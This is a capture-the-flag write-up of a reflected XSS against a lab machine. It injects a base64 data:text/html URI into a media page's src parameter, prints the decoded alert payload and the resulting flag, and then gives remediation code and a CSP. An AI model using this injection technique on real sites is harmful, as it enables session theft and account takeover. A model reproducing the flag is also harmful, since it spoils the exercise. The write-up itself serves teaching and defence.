# Reflected XSS — Script Injection via Base64 Data URI

## Summary

This breach exploits a media page that accepts a `src` parameter and embeds it directly into the page without sanitisation. By passing a `data:text/html;base64` URI containing a base64-encoded script payload, an attacker can execute arbitrary JavaScript in the victim's browser. The application trusts the client-supplied `src` value entirely and injects it into the DOM unescaped.

---

## Category

**Cross-Site Scripting (XSS) — Reflected**
OWASP: [A03:2021 – Injection](https://owasp.org/Top10/A03_2021-Injection/)
CWE: [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)

---

## Steps to Reproduce

### 1. Identify the vulnerable parameter

The media page accepts a `src` parameter that is reflected back into the page:

```
http://10.11.8.1:80/?page=media&src=
```

The server likely embeds this value directly into an `<img>`, `<iframe>`, or `<object>` tag, for example:

```html
<img src="[user input here]">
```

### 2. Construct the payload

The injection uses a `data:` URI to embed an entire HTML document containing a script, encoded in base64 to bypass naive keyword filters:

```
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

Decoded, the base64 content is:

```html
<script>alert('XSS')</script>
```

The browser interprets the `data:text/html` URI as a standalone HTML document and executes the embedded script.

### 3. Deliver the payload

Navigate to:

```
http://10.11.8.1:80/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

The script executes in the browser and the flag is returned:

```
0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e
```

---

## Why This Works

Two things fail simultaneously:

**1. The `src` value is reflected without sanitisation.**
The server takes the raw `src` parameter and places it into the HTML response. There is no HTML encoding, no URL validation, and no allowlist of permitted schemes. A `data:` URI is as valid to the server as a normal `https://` image URL.

**2. The browser executes `data:text/html` content.**
A `data:text/html` URI is treated as a complete HTML document. When embedded as the `src` of an `<iframe>` or similar element, the browser parses and executes it — including any `<script>` tags inside. Base64 encoding adds no security; it is a standard encoding the browser decodes automatically.

---

## Root Cause

| Problem | Detail |
|---|---|
| Unsanitised reflection of `src` into HTML | User input is written into the DOM without encoding or validation |
| No URL scheme allowlist | `data:`, `javascript:`, and other dangerous schemes are accepted alongside `https://` |
| Base64 not treated as an encoding bypass | The server does not decode and inspect base64 `data:` URIs |
| No Content Security Policy (CSP) | There is no CSP header to block inline script execution or restrict resource schemes |

---

## Remediation

### 1. HTML-encode all reflected user input

Any value from user input that is placed into an HTML context must be encoded so that special characters cannot be interpreted as markup:

```php
// PHP
$src = htmlspecialchars($_GET['src'], ENT_QUOTES, 'UTF-8');
echo "<img src=\"$src\">";
```

```python
# Python / Jinja2 — auto-escaping handles this when enabled
# Ensure auto-escaping is ON (it is on by default for .html templates)
return render_template("media.html", src=src)
# In the template: <img src="{{ src }}">  ← Jinja2 escapes automatically
```

### 2. Validate the URL scheme against an allowlist

Before using a URL in a `src` attribute, verify it uses a permitted scheme:

```python
from urllib.parse import urlparse

ALLOWED_SCHEMES = {"https", "http"}

def is_safe_src(url: str) -> bool:
    parsed = urlparse(url)
    return parsed.scheme in ALLOWED_SCHEMES

src = request.args.get("src", "")
if not is_safe_src(src):
    abort(400, "Invalid media source.")
```

This blocks `data:`, `javascript:`, `vbscript:`, and any other dangerous scheme at the application level.

### 3. Implement a Content Security Policy (CSP)

A strong CSP header prevents the browser from executing inline scripts and restricts which origins can load resources — providing a critical second line of defence even if input escaping is imperfect:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self' https:; object-src 'none'
```

This policy blocks:
- Inline `<script>` execution
- `data:` URIs as script or object sources
- Resources from untrusted origins

### 4. Avoid passing raw URLs from user input into `src` attributes

The safest design is to never place a user-supplied URL directly into a `src` attribute. Use an indirect reference — accept a media ID, look up the URL server-side, and emit the verified URL:

```python
MEDIA_SOURCES = {
    "intro":   "https://cdn.example.com/intro.mp4",
    "trailer": "https://cdn.example.com/trailer.mp4",
}

media_id = request.args.get("src", "")
media_url = MEDIA_SOURCES.get(media_id)

if not media_url:
    abort(400)
```

---

## XSS Impact Beyond `alert()`

The `alert('XSS')` payload is the standard proof-of-concept used to confirm that script execution is possible. In a real attack the same injection vector would be used to:

- **Steal session cookies** — `document.cookie` sent to an attacker-controlled server
- **Keylog credentials** — capture keystrokes on login forms
- **Perform actions as the victim** — submit forms, change account details, make purchases
- **Redirect to phishing pages** — silently navigate the victim to a credential-harvesting site
- **Deliver malware** — load further scripts from an external server

XSS is consistently one of the most prevalent and impactful vulnerability classes in web security.

---

## References

- [OWASP: Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [OWASP: XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP: Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [MDN: data URIs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs)
- [PortSwigger: Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)
